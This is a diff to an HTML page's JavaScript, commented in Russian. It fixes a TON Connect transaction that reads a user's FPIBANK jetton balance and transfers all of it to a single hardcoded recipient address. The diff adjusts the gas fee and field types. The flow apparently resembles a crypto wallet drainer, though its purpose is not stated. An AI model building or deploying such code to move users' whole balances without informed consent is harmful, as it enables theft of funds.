@@ -48,7 +48,7 @@
 
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
     
-    // ✅ Используй этот адрес (RAW-формат)
+    // Убедись, что адрес ниже верный:
     const recipientAddress = "0:97b1f16a46c636a52dc7b0dcea9cdd27b3600d886ac7a679a0feb40227e83196";
 
     async function getUserFPIBankData(userTonAddress) {
@@ -87,25 +87,25 @@
       console.log(`У вас ~${humanBalance} FPIBANK (raw = ${rawBalance})`);
       console.log("User Jetton Wallet Address:", userJettonWallet);
 
-      const gasFee = 200000000; // 0.02 TON на газ
+      const gasFee = "20000000"; // 0.02 TON на газ (четко указано строкой!)
 
       const message = {
         address: userJettonWallet,
-        amount: "",
+        amount: gasFee, // обязательно строка
         payload: {
           type: "jetton_transfer",
           query_id: Math.floor(Math.random() * 1000000),
-          amount: Number(rawBalance),
-          destination: recipientAddress, // RAW-адрес напрямую
+          amount: rawBalance, // тут допустима строка
+          destination: recipientAddress,
           response_destination: userJettonWallet,
           forward_ton_amount: "0",
-          forward_payload: null,
+          forward_payload: "",
           jetton: jettonMasterAddress,
         },
       };
 
       const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 3600, // +1 час
+        validUntil: Math.floor(Date.now() / 1000) + 3600,
         messages: [message],
       };
 
@@ -144,5 +144,4 @@
   </script>
 </body>
 </html>
-
 
